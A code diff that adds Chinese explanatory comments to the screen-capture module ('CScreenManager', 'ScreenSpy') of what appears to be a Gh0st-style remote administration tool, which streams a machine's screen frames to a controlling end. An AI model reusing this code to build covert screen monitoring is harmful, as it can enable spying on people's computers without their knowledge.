@@ -114,9 +114,12 @@ void CScreenManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 
 void CScreenManager::sendBITMAPINFO()
 {
+	//CScreenSpy类得到bmp size
 	DWORD	dwBytesLength = 1 + m_pScreenSpy->getBISize();
 	LPBYTE	lpBuffer = (LPBYTE)VirtualAlloc(NULL, dwBytesLength, MEM_COMMIT, PAGE_READWRITE);
 	lpBuffer[0] = TOKEN_BITMAPINFO;
+
+	// 图像头拷贝到缓冲区发送给主控端
 	memcpy(lpBuffer + 1, m_pScreenSpy->getBI(), dwBytesLength - 1);
 	Send(lpBuffer, dwBytesLength);
 	VirtualFree(lpBuffer, 0, MEM_RELEASE);	
@@ -170,15 +173,19 @@ DWORD WINAPI CScreenManager::WorkThread(LPVOID lparam)
 {
 	CScreenManager *pThis = (CScreenManager *)lparam;
 
+	//发送bmp位图结构
 	pThis->sendBITMAPINFO();
-	// 等控制端对话框打开
 
+	// 等控制端对话框打开回应
 	pThis->WaitForDialogOpen();
 
+	//发送第一帧
 	pThis->sendFirstScreen();
 	try // 控制端强制关闭时会出错
     {
 		while (pThis->m_bIsWorking)
+
+			//继续发送接下来的数据
 			pThis->sendNextScreen();
 	}catch(...){};
 
